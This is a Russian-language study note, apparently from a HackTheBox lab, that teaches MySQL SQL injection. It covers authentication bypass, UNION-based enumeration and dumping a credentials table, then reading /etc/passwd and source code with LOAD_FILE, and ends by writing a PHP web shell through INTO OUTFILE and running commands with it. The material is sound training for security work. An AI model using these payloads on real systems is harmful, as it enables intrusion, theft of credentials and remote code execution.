# Обнаружение SQLi

Прежде чем мы начнем нарушать логику веб-приложения и пытаться обойти аутентификацию, мы сначала должны проверить, уязвима ли форма входа в систему для SQL-инъекций. Для этого мы попытаемся добавить одну из следующих полезных нагрузок после нашего имени пользователя и посмотрим, вызывает ли это какие-либо ошибки или меняет поведение страницы:

|Полезная нагрузка|URL в кодировке|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|

>[!Note]
>В некоторых случаях нам может потребоваться использовать версию полезной нагрузки в кодировке URL. Примером этого является ситуация, когда мы помещаем нашу полезную нагрузку непосредственно в URL-адрес 'т.е. HTTP GET запрос'.

---

## '1'='1'

Примером условия, которое всегда будет возвращать `true`, является `'1'='1'`. Однако, чтобы сохранить работу SQL-запроса и четное количество кавычек, вместо использования ('1'='1'), мы удалим последнюю кавычку и используем ('1'='1), чтобы оставшаяся одинарная кавычка из исходного запроса была на своем месте.

![[Pasted image 20250920180801.png]]

>[!Note]
>Полезная нагрузка, которую мы использовали выше, является одной из многих полезных нагрузок обхода аутентификации, которые мы можем использовать для нарушения логики аутентификации. Вы можете найти полный список полезных нагрузок обхода аутентификации SQLi в [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass), каждый из которых работает с определенным типом SQL-запросов.

---

## Комментарии

Как и любой другой язык, SQL также позволяет использовать комментарии. Комментарии используются для документирования запросов или игнорирования определенной части запроса. Мы можем использовать два типа строковых комментариев в MySQL `--` и `#`, в дополнение к встроенному комментарию `/**/` (хотя он обычно не используется в SQL-инъекциях). Их можно использовать следующим образом: 

```sql
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
4 rows in set (0.00 sec)
```

>[!Note]
>В SQL использование только двух тире недостаточно для начала комментария. Таким образом, после них должно быть пустое место, поэтому комментарий начинается с (`--` ), с пробелом в конце. Иногда URL кодируется как (`--+`), так как пробелы в URL кодируются как (`+`). Чтобы было понятно, мы добавим еще один символ (`-`) в конце (`-- -`), чтобы показать использование символа пробела.

Также можно использовать символ `#`.
```sql
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

>[!Note]
>Если вы вводите полезную нагрузку в URL-адрес в браузере, символ (`#`) обычно считается тегом и не передается как часть URL-адреса. Чтобы использовать (`#`) в качестве комментария в браузере, мы можем использовать '`%23`', который является символом (`#`) в кодировке URL-адреса.

Сервер будет игнорировать часть запроса `AND password = 'something'` во время оценки.

---

## Другой пример - скобки

SQL поддерживает использование скобок, если приложению необходимо проверить определенные условия перед другими. Выражения в круглых скобках имеют приоритет над другими операторами и вычисляются в первую очередь. Давайте рассмотрим такой сценарий:

![[Pasted image 20250920182449.png]]

Из предыдущего раздела о комментариях мы знаем, что мы можем использовать их для комментирования остальной части запроса. Итак, давайте попробуем использовать `admin')--` в качестве имени пользователя:

![[Pasted image 20250920182625.png]]

---

# Оператор UNION

Попробуем использовать `UNION` для объединения 2х результатов:
```sql
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

Как мы видим, `UNION` объединяет вывод обоих операторов `SELECT` в один, поэтому записи из таблицы и таблицы `ports` были объединены в один вывод с четырьмя строками `ships`. 

>[!Warning]
>Типы данных выбранных столбцов на всех позициях должны быть одинаковыми.

---

## Равное количество столбцов

Оператор `UNION` может работать только с операторами `SELECT` с равным количеством столбцов. Например, если мы попытаемся выполнить два запроса, которые имеют результаты с разным количеством столбцов, мы получим следующую ошибку:
```sql
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

Приведенный выше запрос приводит к ошибке, так как первый `SELECT` возвращает один столбец, а второй — два. Когда у нас есть два запроса `SELECT`, возвращающих одинаковое количество столбцов, мы можем использовать оператор `UNION` для извлечения данных из других таблиц и баз данных.

Например, если запрос:
```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

Мы можем внедрить запрос `UNION` во входные данные, чтобы были возвращены строки из другой таблицы:
```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

Приведенный выше запрос вернет записи `username` и `password` из таблицы `passwords`, предполагая, что таблица `products` имеет два столбца.

---

## Неравное количество столбцов

Мы обнаружим, что исходный запрос `SELECT` обычно не будет иметь того же количества столбцов, что и SQL-запрос, который мы хотим выполнить, поэтому нам придется обойти это. Например, предположим, что у нас есть только один столбец. В этом случае, мы можем поместить мусорные данные для оставшихся обязательных столбцов, чтобы общее количество столбцов, с которыми мы работаем, оставалось таким же, как и в исходном запросе.

Например, мы можем использовать любую строку в качестве мусорных данных, и запрос `UNION` вернет строку в качестве выходных данных для этого столбца. Если использовать строку `"junk"`, запрос `SELECT` будет `SELECT "junk" from passwords`, который всегда будет возвращать `junk`. Мы также можем использовать цифры. Например, запрос `SELECT 1 from passwords` всегда будет возвращать `1` в качестве выходных данных.

>[!Warning]
>При заполнении других столбцов мусорными данными мы должны убедиться, что тип данных совпадает с типом данных столбцов, иначе запрос вернет ошибку. Для простоты мы будем использовать числа в качестве мусорных данных, которые также станут удобными для отслеживания местоположения наших полезных грузов, о чем мы поговорим позже.

>[!Совет]
>Для продвинутой SQL-инъекции мы можем просто использовать 'NULL' для заполнения других столбцов, так как 'NULL' подходит для всех типов данных.

В приведенном выше примере таблица `products` имеет два столбца, поэтому нам приходится добавлять два столбца. Если бы мы хотели получить с помощью `UNION` только один столбец, например `username`, мы должны сделать `username, 2`, чтобы у нас было одинаковое количество столбцов:
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

Если бы у нас было больше столбцов в таблице исходного запроса `SELECT`, нам бы пришлось добавить больше чисел, чтобы создать оставшиеся необходимые столбцы. Например, если исходный запрос использовался для таблицы с четырьмя столбцами, наше внедрение `UNION` будет следующим:
```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```
Этот запрос вернет:
```sql
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

Как мы видим, желаемый вывод запроса '`UNION SELECT username from passwords`' находится в первом столбце второй строки, в то время как числа заполнили остальные столбцы.

---

## Определение количества столбцов

Прежде чем приступить к работе с запросами на основе объединений, нам нужно найти количество столбцов, выбранных сервером. Существует два метода определения количества столбцов:

- Использование `ORDER BY`
- Использование `UNION`

#### Использование ORDER BY

Первый способ определения количества столбцов — через функцию `ORDER BY`. Мы должны внедрить запрос, который сортирует результаты по указанному нами столбцу, т.е. столбцу 1, столбцу 2 и так далее, пока мы не получим ошибку о том, что указанный столбец не существует.

Например, мы можем начать с `order by 1`, отсортировать по первому столбцу и добиться успеха, так как в таблице должен быть хотя бы один столбец. Затем мы будем делать `order by 2` и далее до тех пор, пока не дойдем до числа, которое возвращает ошибку, или страница не показывает никакого вывода, а это значит, что номер этого столбца не существует. Последний успешный столбец, по которому мы успешно отсортировали, дает нам общее количество столбцов.

Если мы потерпели неудачу в `order by 4`, это означает, что в таблице три столбца, по которым мы смогли успешно отсортировать. Давайте вернемся к нашему предыдущему примеру и попробуем сделать то же самое, со следующей полезной нагрузкой:
```sql
' order by 1-- -
```

> Напоминание: Мы добавляем дополнительное тире (-) в конце, чтобы показать вам, что после (--) есть пробел.

Как видим, получаем нормальный результат:
![[Pasted image 20250920185954.png]]

Мы делаем то же самое для столбца `4` и получаем результаты. Однако, когда мы пытаемся открыть столбец 5, мы получаем следующую ошибку:
![[Pasted image 20250920190033.png]]

Это означает, что в этой таблице ровно 4 столбца.

---

#### Использование UNION

Другой метод заключается в том, чтобы попытаться внедрить объединение с другим количеством столбцов до тех пор, пока мы не получим результаты. Первый метод всегда возвращает результаты до тех пор, пока мы не столкнемся с ошибкой, в то время как метод `UNION` всегда выдает ошибку до тех пор, пока мы не добьемся успеха. Мы можем начать с внедрения запроса в 3 столбца:
```sql
cn' UNION select 1,2,3-- -
```

Мы получаем сообщение об ошибке о том, что количество столбцов не совпадает:
![[Pasted image 20250920190231.png]]

Итак, давайте попробуем четыре столбца и посмотрим на ответ:
```sql
cn' UNION select 1,2,3,4-- -
```
![[Pasted image 20250920190256.png]]

На этот раз мы успешно получаем результаты, что снова означает, что таблица имеет 4 столбца. Для определения количества столбцов мы можем использовать любой из этих методов. Как только мы знаем количество столбцов, мы знаем, как сформировать нашу полезную нагрузку, и мы можем перейти к следующему шагу.

---

## Место инъекции

Хотя запрос может возвращать несколько столбцов, веб-приложение может отображать только некоторые из них. Таким образом, если мы внедрим наш запрос в столбец, который не печатается на странице, мы не получим его вывода. Вот почему нам нужно определить, какие столбцы будут выведены на страницу, чтобы определить, где разместить наш впрыск. В предыдущем примере, в то время как внедренный запрос возвращал 1, 2, 3 и 4, мы увидели только 2, 3 и 4, отображаемые нам на странице в качестве выходных данных:
![[Pasted image 20250920190418.png]]

Очень часто не каждый столбец отображается обратно для пользователя. Например, поле ID часто используется для связывания разных таблиц между собой, но пользователю не нужно его видеть. Это говорит нам о том, что столбцы 2, 3 и 4 печатаются для размещения нашего впрыска в любом из них. 

`We cannot place our injection at the beginning, or its output will not be printed.`

В этом заключается преимущество использования чисел в качестве мусорных данных, поскольку это позволяет легко отслеживать, какие столбцы печатаются, поэтому мы знаем, в какой столбец поместить наш запрос. Чтобы проверить, можем ли мы получить фактические данные из базы данных, а не просто цифры, мы можем использовать SQL-запрос `@@version` в качестве теста и поместить его во второй столбец вместо цифры 2:
```sql
cn' UNION select 1,@@version,3,4-- -
```
![[Pasted image 20250920190824.png]]

Как мы видим, мы можем получить отображаемую версию базы данных. Теперь мы знаем, как формировать полезные данные для внедрения Union SQL, чтобы успешно получить вывод нашего запроса, напечатанный на странице. 

---

# Определение СУБД, БД, таблиц и столбцов

Прежде чем перечислять базу данных, нам обычно нужно определить тип СУБД, с которой мы имеем дело. Это связано с тем, что у каждой СУБД разные запросы, и знание того, что это такое, поможет нам понять, какие запросы использовать.

В качестве первоначального предположения, если веб-сервер, который мы видим в HTTP-ответах, имеет вид `Apache` или `Nginx`, то можно предположить, что веб-сервер работает на Linux, поэтому СУБД, скорее всего, `MySQL`. То же самое относится и к СУБД Microsoft, если веб-сервер — `IIS`, скорее всего, СУБД будет `MSSQL`. Однако это надуманное предположение, так как многие другие базы данных могут использоваться как в операционной системе, так и на веб-сервере. Таким образом, существуют различные запросы, которые мы можем протестировать, чтобы определить тип базы данных, с которой мы имеем дело.

Как мы уже рассказывали в этом модуле, давайте рассмотрим fingerprint базы данных MySQL. Следующие запросы и их ответы скажут нам, с чем мы имеем дело:

|Полезная нагрузка|Когда использовать|Ожидаемый результат|Неправильный вывод|
|---|---|---|---|
|`SELECT @@version`|Когда у нас есть полный вывод запроса|Версия MySQL 'т.е. `10.3.22-MariaDB-1ubuntu1`'|В MSSQL он возвращает версию MSSQL. Ошибка с другими СУБД.|
|`SELECT POW(1,1)`|Когда у нас есть только числовой вывод|`1`|Ошибка с другими СУБД|
|`SELECT SLEEP(5)`|Блайнд/Нет выхода|Задерживает отклик страницы на 5 секунд и возвращает .`0`|Не будет задерживать ответ с другими СУБД|

Как мы видели в примере из предыдущего раздела, когда мы попробовали `@@version`, он выдал нам:

![[Pasted image 20250920192022.png]]

По ответу `10.3.22-MariaDB-1ubuntu1` получается, что мы имеем дело с СУБД, похожей на MySQL. Поскольку у нас есть прямой ответ запроса `MariaDB`, нам не придется тестировать другие полезные нагрузки. Вместо этого мы можем протестировать их и посмотреть, что получится.

---

## База данных INFORMATION_SCHEMA

Чтобы получить данные из таблиц с помощью `UNION SELECT`, нам нужно правильно формировать наши запросы. Для этого нам нужна следующая информация:
- Список баз данных
- Список таблиц в каждой базе данных
- Список столбцов в каждой таблице

Имея вышеуказанную информацию, мы можем сформировать наш оператор для выгрузки данных из любого столбца в любой таблице в любой базе данных внутри СУБД. Именно здесь мы можем использовать базу данных `INFORMATION_SCHEMA`.

База [данных INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) содержит метаданные о базах данных и таблицах, присутствующих на сервере. Эта база данных играет решающую роль в эксплуатации уязвимостей SQL-инъекций. Так как это другая база данных, мы не можем вызвать ее таблицы напрямую с помощью оператора `SELECT`. Если мы укажем только имя таблицы для оператора `SELECT`, он будет искать таблицы в той же базе данных.

Таким образом, для ссылки на таблицу, присутствующую в другой БД, мы можем использовать оператор точки '`.`'. Например `SELECT`, к таблице `users`, присутствующей в базе данных с именем `my_database`, мы можем использовать:
```sql
SELECT * FROM my_database.users;
```

Аналогичным образом мы можем посмотреть на таблицы, присутствующие в базе данных `INFORMATION_SCHEMA`.

---

## SCHEMATA - БАЗЫ ДАННЫХ

Для начала перечисления необходимо найти, какие базы данных доступны на СУБД. Таблица [SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) в базе данных `INFORMATION_SCHEMA` содержит информацию обо всех базах данных на сервере. Он используется для получения имен баз данных (`SCHEMA_NAME`), чтобы мы могли затем запрашивать их. Столбец содержит все имена баз данных, присутствующие в данный момент.

Давайте сначала проверим это на локальной базе данных, чтобы увидеть, как используется запрос:
```sql
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

Мы видим и базы данных `ilfreight` и `dev`.

>[!Note]
>Первые три базы данных по умолчанию являются базами данных MySQL и присутствуют на любом сервере, поэтому мы обычно игнорируем их при перечислении БД. Иногда существует и четвертая база данных «sys».

Теперь давайте сделаем то же самое с помощью SQL-инъекции со следующей полезной нагрузкой `UNION`:
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
![[Pasted image 20250920192816.png]]

И снова мы видим две базы данных: `ilfreight` и `dev`, кроме стандартных. Давайте выясним, из какой базы данных запущено веб-приложение для получения данных о портах. Мы можем найти актуальную базу данных с помощью запроса `SELECT database()`. Мы можем сделать это аналогично тому, как мы нашли версию СУБД в предыдущем разделе:
```sql
cn' UNION select 1,database(),2,3-- -
```
![[Pasted image 20250920193008.png]]

Мы видим, что имя базы данных — `ilfreight`. Тем не менее, другая база данных (`dev`) выглядит интересно. Итак, попробуем извлечь из него таблицы.

---

## TABLES - ТАБЛИЦЫ

Прежде чем мы выгрузим данные из базы данных `dev`, нам нужно получить список таблиц, чтобы запросить их с помощью оператора `SELECT`. Чтобы найти все таблицы в базе данных, мы можем использовать таблицу `TABLES` в базе данных `INFORMATION_SCHEMA`.

Таблица [TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html) содержит информацию обо всех таблицах в базе данных. Эта таблица содержит несколько столбцов, но нас интересуют столбцы `TABLE_SCHEMA` и `TABLE_NAME`. В столбце `TABLE_NAME` хранятся имена таблиц, а в столбце `TABLE_SCHEMA` указана база данных, к которой принадлежит каждая таблица. Это можно сделать аналогично тому, как мы нашли имена баз данных. Например, мы можем использовать следующую полезную нагрузку для поиска таблиц в базе данных `dev`:
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

>[!Warning]
>Обратите внимание, как мы заменили числа «2» и «3» на «TABLE_NAME» и «TABLE_SCHEMA», чтобы получить вывод обоих столбцов в одном запросе.

![[Pasted image 20250920193441.png]]

>[!Note]
>Мы добавили условие (где table_schema='dev') для возврата только таблиц из базы данных 'dev', иначе мы получим все таблицы во всех базах данных, которых может быть много.

В базе данных dev мы видим четыре таблицы, а именно `credentials`, `framework`, `pages`, и `posts`. Например, таблица `credentials` может содержать конфиденциальную информацию, чтобы изучить ее.

---

## ## COLUMNS - СТОЛБЦЫ

Чтобы выгрузить данные таблицы `credentials`, нам сначала нужно найти названия столбцов в таблице. Таблица [COLUMNS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) в `INFORMATION_SCHEMA` содержит информацию обо всех столбцах, присутствующих во всех базах данных. Это помогает нам найти имена столбцов для запроса таблицы `credentials`. Для этого можно использовать столбцы `COLUMN_NAME`, `TABLE_NAME`, и `TABLE_SCHEMA`. Как мы делали ранее, давайте попробуем эту полезную нагрузку, чтобы найти имена столбцов в таблице `credentials`:
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
![[Pasted image 20250920193914.png]]

---

## DATA - ДАННЫЕ

Теперь, когда у нас есть вся информация, мы можем сформировать наш `UNION`-запрос на выгрузку данных столбцов `username` и `password` из таблицы `credentials` в базе данных `dev`. Мы можем разместить `username` и `password` на месте столбцов 2 и 3:
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

>[!Warning]
>Не забудьте использовать оператор `.` для ссылки на 'credentials' в базе данных 'dev', поскольку мы работаем в базе данных 'ilfreight', как обсуждалось ранее.

![[Pasted image 20250920194218.png]]

Нам удалось получить все записи в таблице `credentials`, которая содержит конфиденциальную информацию, такую как хеши паролей и ключ API.

---

# Чтение файлов

#### Пользователь БД

Во-первых, мы должны определить, каким пользователем мы являемся в базе данных. Хотя для чтения данных нам не обязательно нужны привилегии администратора базы данных (DBA), в современных СУБД они становятся все более необходимыми, поскольку такие привилегии предоставляются только администраторам баз данных. 
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Полезная нагрузка для `UNION`-инъекции будет следующей:
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
или:
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
![[Pasted image 20250920204702.png]]

---

#### Привилегии пользователя

Теперь, когда мы знаем своего пользователя, мы можем начать поиск, какие привилегии у нас есть с этим пользователем. Прежде всего, мы можем проверить, есть ли у нас привилегии  super admin с помощью следующего запроса:
```sql
SELECT super_priv FROM mysql.user
```
Опять же, мы можем использовать следующую полезную нагрузку с приведенным выше запросом:
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
Если у нас было много пользователей в СУБД, мы можем добавить привилегии для отображения только для нашего текущего пользователя:`WHERE user="root"``root`
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
![[Pasted image 20250920204850.png]]

Запрос возвращает `Y`, что означает `YES`, указывающее на привилегии суперпользователя. Мы также можем выгрузить другие имеющиеся у нас привилегии непосредственно из схемы с помощью следующего запроса:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
Здесь мы можем добавить только наши текущие привилегии пользователя. Наша полезная нагрузка будет следующей:`WHERE grantee="'root'@'localhost'"``root`
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

И мы видим все возможные привилегии, предоставленные нашему текущему пользователю:
![[Pasted image 20250920205002.png]]

Мы видим, что привилегия `FILE` указана для нашего пользователя, что позволяет нам читать файлы и, возможно, даже записывать файлы. Таким образом, мы можем продолжить попытки чтения файлов.

---

## LOAD_FILE

Теперь, когда мы знаем, что у нас достаточно привилегий для чтения локальных системных файлов, давайте сделаем это с помощью этой функции. Функция [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) может быть использована в MariaDB / MySQL для чтения данных из файлов. Функция принимает только один аргумент, который является именем файла. Следующий запрос является примером того, как прочитать файл:`LOAD_FILE()``/etc/passwd`

Код: sql

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Примечание: Мы сможем прочитать файл только в том случае, если пользователь ОС, использующий MySQL, имеет достаточные привилегии для его чтения.

Аналогично тому, как мы использовали инъекцию, мы можем использовать приведенный выше запрос:`UNION`:
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
![[Pasted image 20250920205113.png]]

Мы смогли успешно прочитать содержимое файла passwd с помощью SQL-инъекции. К сожалению, это потенциально может быть использовано и для утечки исходного кода приложения.

---

## Другой пример

Мы знаем, что текущая страница — это `search.php`. По умолчанию веб-корнем Apache является `/var/www/html`. Давайте попробуем прочитать исходный код файла в `/var/www/html/search.php`:
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
![[Pasted image 20250920205227.png]]

Тем не менее, страница в конечном итоге отображает HTML-код в браузере. Исходный код HTML можно просмотреть, нажав кнопку .`[Ctrl + U]`

![[Pasted image 20250920205237.png]]

Исходный код показывает нам весь код PHP, который можно дополнительно изучить, чтобы найти конфиденциальную информацию, такую как учетные данные для подключения к базе данных, или найти больше уязвимостей.

---

# Запись файлов

Когда дело доходит до записи файлов на внутренний сервер, это становится гораздо более ограниченным в современных СУБД, поскольку мы можем использовать это для написания веб-оболочки на удаленном сервере, тем самым получая выполнение кода и захватывая сервер. Вот почему современные СУБД по умолчанию отключают запись файлов и требуют определенных привилегий для DBA для записи файлов. Перед записью файлов мы должны сначала проверить, достаточно ли у нас прав и позволяет ли СУБД записывать файлы.

---

## Права доступа к файлам записи

Чтобы иметь возможность записывать файлы на внутренний сервер с помощью базы данных MySQL, нам требуются три вещи:
1. Пользователь с включенными привилегиями`FILE`
2. Глобальная переменная MySQL `secure_file_priv` не включена
3. Доступ на запись к местоположению, в которое мы хотим записывать данные на внутреннем сервере

Мы уже обнаружили, что наш текущий пользователь обладает привилегией `FILE`, необходимой для записи файлов. Теперь мы должны проверить, есть ли у базы данных MySQL это привилегия. Это можно сделать, проверив глобальную переменную `secure_file_priv`.

#### secure_file_priv

Переменная [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) используется для определения места чтения/записи файлов. Пустое значение позволяет нам читать файлы из всей файловой системы. В противном случае, если задана определенная директория, мы можем читать только из папки, указанной переменной `NULL`. С другой стороны, это означает, что мы не можем читать/записывать из какого-либо каталога. По умолчанию в MariaDB эта переменная пуста, что позволяет нам читать/записывать в любой файл, если у пользователя есть привилегия. Однако `/var/lib/mysql-files` используется в качестве папки по умолчанию. Это означает, что чтение файлов с помощью инъекции невозможно с настройками по умолчанию. Хуже того, некоторые современные конфигурации `MySQL` по умолчанию имеют значение `NULL`, что означает, что мы не можем читать/записывать файлы где-либо в системе.

Итак, давайте посмотрим, как мы можем узнать значение `secure_file_priv`. Внутри `MySQL` мы можем использовать следующий запрос для получения значения этой переменной:
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Однако, поскольку мы используем инъекцию `UNION`, мы должны получить значение с помощью оператора `SELECT`. Это не должно быть проблемой, так как все переменные и большинство конфигураций хранятся в базе данных `INFORMATION_SCHEMA`. Глобальные переменные хранятся в таблице с именем [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), и, согласно документации `MySQL`, эта таблица имеет два столбца: `variable_name` и `variable_value`.

Мы должны выбрать эти два столбца из этой таблицы в базе данных `INFORMATION_SCHEMA`. В конфигурации MySQL есть сотни глобальных переменных, и мы не хотим извлекать их все. Поэтому мы отфильтруем результаты, чтобы показать только переменную `secure_file_priv`, используя оператор `WHERE`.

Итоговый SQL-запрос выглядит следующим образом:
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

Таким образом, как и в случае с другими инъекционными `UNION` запросами, мы можем получить результат вышеуказанного запроса со следующей полезной нагрузкой. Не забудьте добавить еще два столбца `1`и `4` в качестве мусорных данных, чтобы получить в общей сложности 4 столбца:
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
![[Pasted image 20250920210913.png]]

И результат `secure_file_priv` показывает, что значение пустое, а это значит, что мы можем читать/записывать файлы в любое место.

---

## `SELECT .. INTO OUTFILE`

Теперь, когда мы подтвердили, что наш пользователь может записывать файлы на внутренний сервер, давайте попробуем сделать это с помощью оператора `SELECT .. INTO OUTFILE`. Оператор [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) можно использовать для записи данных из запросов select в файлы. Обычно это используется для экспорта данных из таблиц.

Чтобы его использовать, мы можем добавить после нашего запроса `INTO OUTFILE '...'` экспорт результатов `users` в указанный нами файл `/tmp/credentials`. В приведенном ниже примере вывод таблицы сохраняется в файле:
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
Если мы перейдем к внутреннему серверу и файлу, мы увидим содержимое этой таблицы:
```sql
Heiliara@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```
Также есть возможность напрямую вставлять строки в файлы, что позволяет нам записывать произвольные файлы на внутренний сервер.
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
Когда мы получаем файл, мы видим этот текст:
```bash
Heiliara@htb[/htb]$ cat /tmp/test.txt 

this is a test
```
```bash
Heiliara@htb[/htb]$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

Как мы видим выше, файл `test.txt` был успешно создан и принадлежит пользователю `mysql`.

>[!Note]
>Расширенный экспорт файлов использует функцию 'FROM_BASE64("base64_data")' для того, чтобы иметь возможность записывать длинные/расширенные файлы, включая двоичные данные.

---

## Запись файлов через SQL-инъекцию

Давайте попробуем записать текстовый файл в веб-корневой каталог и проверим, есть ли у нас права на запись. Приведенный ниже запрос должен записать данные `file written successfully!` в файл `/var/www/html/proof.txt`, к которому мы затем сможем получить доступ в веб-приложении:
```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

>[!Note]
>Чтобы написать веб-оболочку, мы должны знать базовую веб-директорию для веб-сервера (т.е. веб-корневой каталог). Один из способов найти его — использовать для чтения конфигурацию сервера, например, конфигурацию Apache по адресу `/etc/apache2/apache2.conf`, конфигурацию Nginx по адресу `/etc/nginx/nginx.conf`, или конфигурацию IIS по адресу `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, или мы можем поискать в Интернете другие возможные места для конфигурации. Кроме того, мы можем запустить сканирование с помощью фаззинга и попытаться записать файлы в различные возможные веб-корни, используя [этот список для Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) или [этот список для Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Наконец, если ничего из вышеперечисленного не работает, мы можем использовать отображаемые нам ошибки сервера и попытаться найти веб-каталог таким образом.

Полезная нагрузка для `UNION`-инъекции будет выглядеть следующим образом:
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
![[Pasted image 20250920211755.png]]

Мы не видим никаких ошибок на странице, что говорит о том, что запрос выполнен успешно. Проверив файл `proof.txt` в webroot, мы видим, что он действительно существует:
![[Pasted image 20250920211832.png]]

>[!Note]
>Мы видим строку, которую мы сбросили, вместе с '1', '3' перед ней и '4' после нее. Это связано с тем, что весь результат запроса 'UNION' был записан в файл. Чтобы сделать вывод чище, мы можем использовать "" вместо цифр.

---

## Написание веб-оболочки

Подтвердив права на запись, мы можем пойти дальше и написать веб-оболочку PHP в папку webroot. Мы можем написать следующий веб-шелл PHP, чтобы иметь возможность выполнять команды непосредственно на внутреннем сервере:
```php
<?php system($_REQUEST[0]); ?>
```

Мы можем повторно использовать нашу предыдущую полезную нагрузку для `UNION` инъекции и изменить строку на приведенную выше, а имя файла на `shell.php`:
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
![[Pasted image 20250920211925.png]]

Опять же, мы не видим никаких ошибок, а это значит, что запись файла, вероятно, сработала. Это можно проверить, перейдя к файлу `/shell.php` и выполнив команды с помощью параметра `0`, в нашем URL-адресе `?0=id`:
![[Pasted image 20250920212142.png]]

Вывод команды `id` подтверждает, что у нас выполнен код и мы работаем от имени пользователя `www-data`.